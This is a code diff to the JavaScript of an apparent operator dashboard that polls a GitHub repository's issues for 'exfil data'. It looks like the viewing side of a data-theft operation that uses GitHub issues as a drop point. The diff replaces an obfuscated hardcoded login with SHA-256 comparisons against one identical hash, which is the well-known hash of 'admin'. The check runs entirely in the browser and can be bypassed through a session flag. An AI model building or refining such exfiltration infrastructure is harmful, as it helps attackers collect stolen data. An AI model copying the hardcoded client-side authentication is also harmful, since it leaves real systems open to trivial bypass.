@@ -1,20 +1,17 @@
 (function() {
     'use strict';
-    const ENCODED_CRED = 'b2puZUI=';
-    function decodeCred(encoded) {
-        try {
-            const reversedShifted = atob(encoded);
-            let shifted = '';
-            for (let i = 0; i < reversedShifted.length; i++) {
-                shifted += String.fromCharCode(reversedShifted.charCodeAt(i) - 1);
-            }
-            return shifted.split('').reverse().join('');
-        } catch {
-            return null;
-        }
+
+    const HASH_USER = '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918';
+    const HASH_PASS = '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918';
+
+    async function hashString(str) {
+        const encoder = new TextEncoder();
+        const data = encoder.encode(str);
+        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
     }
-    const VALID_USERNAME = decodeCred(ENCODED_CRED);
-    const VALID_PASSWORD = decodeCred(ENCODED_CRED);
+
     const loginPage = document.getElementById('loginPage');
     const dashboardPage = document.getElementById('dashboardPage');
     const loginForm = document.getElementById('loginForm');
@@ -25,17 +22,24 @@
     const refreshBtn = document.getElementById('refreshBtn');
     const logoutBtn = document.getElementById('logoutBtn');
     const SESSION_KEY = '0xB0_auth';
+
     function isLoggedIn() {
         return sessionStorage.getItem(SESSION_KEY) === 'true';
     }
+
     function setLoggedIn(state) {
         sessionStorage.setItem(SESSION_KEY, state ? 'true' : 'false');
     }
-    loginForm.addEventListener('submit', function(e) {
+
+    loginForm.addEventListener('submit', async function(e) {
         e.preventDefault();
         const user = usernameInput.value.trim();
         const pass = passwordInput.value.trim();
-        if (user === VALID_USERNAME && pass === VALID_PASSWORD) {
+
+        const hashUser = await hashString(user);
+        const hashPass = await hashString(pass);
+
+        if (hashUser === HASH_USER && hashPass === HASH_PASS) {
             setLoggedIn(true);
             loginError.textContent = '';
             showDashboard();
@@ -46,6 +50,7 @@
             usernameInput.focus();
         }
     });
+
     function showDashboard() {
         loginPage.style.display = 'none';
         dashboardPage.style.display = 'block';
@@ -53,6 +58,7 @@
         if (window._refreshInterval) clearInterval(window._refreshInterval);
         window._refreshInterval = setInterval(fetchExfilData, 30000);
     }
+
     function showLogin() {
         loginPage.style.display = 'block';
         dashboardPage.style.display = 'none';
@@ -64,12 +70,15 @@
         passwordInput.value = '';
         loginError.textContent = '';
     }
+
     logoutBtn.addEventListener('click', function() {
         setLoggedIn(false);
         showLogin();
     });
+
     const REPO = 'va1uxxx/0xB0';
     const API_URL = `https://api.github.com/repos/${REPO}/issues`;
+
     async function fetchExfilData() {
         const placeholder = `<div class="placeholder"><i class="fas fa-spinner spinner"></i> FETCHING DATA...</div>`;
         logContainer.innerHTML = placeholder;
@@ -132,6 +141,7 @@
             logContainer.innerHTML = `<div class="error-msg"><i class="fas fa-triangle-exclamation"></i> ERROR: ${escapeHtml(err.message)}</div>`;
         }
     }
+
     function escapeHtml(str) {
         if (!str) return '';
         const map = {
@@ -143,17 +153,20 @@
         };
         return str.replace(/[&<>"']/g, function(m) { return map[m]; });
     }
+
     refreshBtn.addEventListener('click', function() {
         this.innerHTML = '<i class="fas fa-spinner spinner"></i>';
         fetchExfilData().finally(() => {
             this.innerHTML = '<i class="fas fa-sync-alt"></i> Refresh';
         });
     });
+
     if (isLoggedIn()) {
         showDashboard();
     } else {
         showLogin();
     }
+
     document.addEventListener('keydown', function(e) {
         if (e.key === 'Escape' && isLoggedIn()) {
             setLoggedIn(false);
